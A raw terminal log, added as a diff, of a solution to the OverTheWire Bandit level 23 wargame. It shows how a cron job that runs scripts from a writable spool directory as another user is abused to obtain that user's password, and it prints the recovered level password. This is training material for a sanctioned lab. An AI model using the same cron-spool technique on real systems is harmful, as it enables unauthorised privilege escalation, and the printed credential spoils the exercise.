@@ -1,0 +1,69 @@
+┌─[✗]─[root@parrot]─[~]
+└──╼ #ssh bandit23@bandit.labs.overthewire.org -p 2220
+
+bandit23@bandit:~$ cd /etc/cron.d/
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat/usr/bin/cronjob_bandit24.sh
+-bash: cat/usr/bin/cronjob_bandit24.sh: No such file or directory
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        timeout -s 9 60 ./$i
+        rm -f ./$i
+    fi
+done
+
+
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/almost
+mkdir: cannot create directory ‘/tmp/almost’: File exists
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/almost/
+mkdir: cannot create directory ‘/tmp/almost/’: File exists
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/alm/   
+bandit23@bandit:/etc/cron.d$ nano bandit24.sh
+Unable to create directory /home/bandit23/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+bandit23@bandit:/etc/cron.d$ cd
+bandit23@bandit:~$ nano bandit24.sh
+Unable to create directory /home/bandit23/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+bandit23@bandit:~$ cd /tmp/sbs/
+bandit23@bandit:/tmp/sbs$ ls
+bandit23@bandit:/tmp/sbs$ nano bandit24.sh
+Unable to create directory /home/bandit23/.nano: Permission denied
+It is required for saving/loading search history or cursor positions.
+
+Press Enter to continue
+
+bandit23@bandit:/tmp/sbs$ chmod 777 bandit24.sh 
+bandit23@bandit:/tmp/sbs$ cp bandit24.sh /var/spool/bandit24/
+bandit23@bandit:/tmp/sbs$ chmod 777 /tmp/sbs/
+bandit23@bandit:/tmp/sbs$ chmod 777 /tmp/sbs/ls /var/spool/bandit24/
+chmod: cannot access '/tmp/sbs/ls': No such file or directory
+chmod: changing permissions of '/var/spool/bandit24/': Operation not permitted
+bandit23@bandit:/tmp/sbs$ ls /var/spool/bandit24/
+ls: cannot open directory '/var/spool/bandit24/': Permission denied
+bandit23@bandit:/tmp/sbs$ ls /var/spool/bandit24/
+ls: cannot open directory '/var/spool/bandit24/': Permission denied
+bandit23@bandit:/tmp/sbs$ ls
+bandit24.sh  level24
+bandit23@bandit:/tmp/sbs$ cat level24 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+bandit23@bandit:/tmp/sbs$ 
+
